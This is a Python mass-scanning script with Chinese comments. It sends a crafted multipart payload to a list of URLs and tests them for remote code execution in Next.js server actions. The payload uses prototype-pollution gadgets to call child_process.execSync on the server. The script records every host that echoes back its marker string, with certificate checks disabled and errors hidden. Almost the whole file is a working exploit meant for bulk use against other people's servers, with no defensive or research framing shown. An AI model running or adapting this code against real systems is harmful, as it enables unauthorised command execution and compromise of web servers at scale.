import argparse
import os
import sys
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from pathlib import Path

import requests
from requests_toolbelt import MultipartEncoder
import urllib3

# 忽略自签名证书等导致的 InsecureRequestWarning
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

try:
    from tqdm import tqdm
except ImportError:
    class _TqdmFallback:
        def __init__(self, total=0, desc='', unit=''):
            self.total = total
            self.count = 0
            self.desc = desc
            self.unit = unit
            self.postfix = {}
        def __enter__(self):
            return self
        def __exit__(self, exc_type, exc, tb):
            self.close()
        def update(self, n=1):
            self.count += n
            if self.total:
                percent = int(self.count / self.total * 100)
                extras = ''
                if self.postfix:
                    extras = ' ' + ' '.join([f'{k}:{v}' for k, v in self.postfix.items()])
                sys.stdout.write(f'\r{self.desc} {self.count}/{self.total} {percent}%{extras}')
            else:
                extras = ''
                if self.postfix:
                    extras = ' ' + ' '.join([f'{k}:{v}' for k, v in self.postfix.items()])
                sys.stdout.write(f'\r{self.desc} {self.count} {self.unit}{extras}')
            sys.stdout.flush()
        def set_postfix(self, d=None, refresh=False):
            if d is not None:
                self.postfix = d
            if refresh:
                # 触发一次刷新但不增加计数
                self.update(0)
        def close(self):
            sys.stdout.write('\n')
            sys.stdout.flush()
    def tqdm(*args, **kwargs):
        return _TqdmFallback(total=kwargs.get('total', 0), desc=kwargs.get('desc', ''), unit=kwargs.get('unit', ''))


def build_fields_payload():
    return {
        '0': (
            None,
            '{\n  "then": "$1:__proto__:then",\n  "status": "resolved_model",\n  "reason": -1,\n  "value": "{\\"then\\":\\"$B1337\\"}",\n  "_response": {\n    "_prefix": "var res=process.mainModule.require(\'child_process\').execSync(\'echo asdasdsfewfwe23freg\',{\'timeout\':5000}).toString().trim();;throw Object.assign(new Error(\'NEXT_REDIRECT\'), {digest:`${res}`});",\n    "_chunks": "$Q2",\n    "_formData": {\n      "get": "$1:constructor:constructor"\n    }\n  }\n}'
        ),
        '1': (None, '"$@0"'),
        '2': (None, '[]')
    }


def send_request(url, timeout, print_lock, show_response=False):
    fields = build_fields_payload()
    m = MultipartEncoder(fields=fields, boundary='----WebKitFormBoundaryx8jO2oVc6SWP3Sad')

    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36 Assetnote/1.0.0',
        'Next-Action': 'x',
        'X-Nextjs-Request-Id': 'b5dce965',
        'Content-Type': m.content_type,
        'X-Nextjs-Html-Request-Id': 'SSTMXm7OJ_g0Ncx6jpQt9',
    }

    try:
        # 忽略证书校验
        response = requests.post(url, headers=headers, data=m, timeout=timeout, verify=False)
        found = 'asdasdsfewfwe23freg' in response.text
        # 不输出任何单条请求信息，返回结果由主进度条统计
        return found
    except requests.exceptions.SSLError:
        # 证书问题等 SSL 错误直接忽略，不打印
        return False
    except Exception as e:
        return False

    return found


def main():
    parser = argparse.ArgumentParser(description='并发请求：可自定义线程数、进度条与成功写入文件')
    parser.add_argument('--threads', type=int, default=10, help='并发线程数 (默认 10)')
    parser.add_argument('--input', type=str, default='urls.txt', help='URL 列表文件路径')
    parser.add_argument('--output', type=str, default='success.txt', help='成功结果输出文件路径')
    parser.add_argument('--timeout', type=float, default=10.0, help='HTTP 超时秒数 (默认 10)')
    parser.add_argument('--show-response', action='store_true', help='打印响应正文')
    args = parser.parse_args()

    base_dir = Path(__file__).resolve().parent
    input_path = Path(args.input)
    if not input_path.is_absolute():
        input_path = base_dir / input_path
    output_path = Path(args.output)
    if not output_path.is_absolute():
        output_path = base_dir / output_path

    if not input_path.exists():
        print(f'输入文件不存在: {input_path}')
        sys.exit(1)

    with input_path.open('r', encoding='utf-8') as file:
        urls = [line.strip() for line in file if line.strip()]

    if not urls:
        print('URL 列表为空')
        sys.exit(0)

    write_lock = threading.Lock()
    print_lock = threading.Lock()

    # 确保输出目录存在
    output_path.parent.mkdir(parents=True, exist_ok=True)

    def worker(u):
        ok = send_request(u, args.timeout, print_lock, args.show_response)
        if ok:
            with write_lock:
                with output_path.open('a', encoding='utf-8') as f:
                    f.write(f'{u}\n')
                    f.flush()
                    try:
                        os.fsync(f.fileno())
                    except Exception:
                        pass
        return ok

    try:
        with ThreadPoolExecutor(max_workers=max(1, args.threads)) as executor:
            futures = [executor.submit(worker, u) for u in urls]
            success_count = 0
            fail_count = 0
            with tqdm(total=len(urls), desc='处理进度', unit='url') as pbar:
                pbar.set_postfix({'成功': success_count, '失败': fail_count}, refresh=True)
                for future in as_completed(futures):
                    ok = future.result()
                    if ok:
                        success_count += 1
                    else:
                        fail_count += 1
                    pbar.update(1)
                    pbar.set_postfix({'成功': success_count, '失败': fail_count}, refresh=True)
    except KeyboardInterrupt:
        print('\n用户中断，正在停止任务…')


if __name__ == '__main__':
    main()
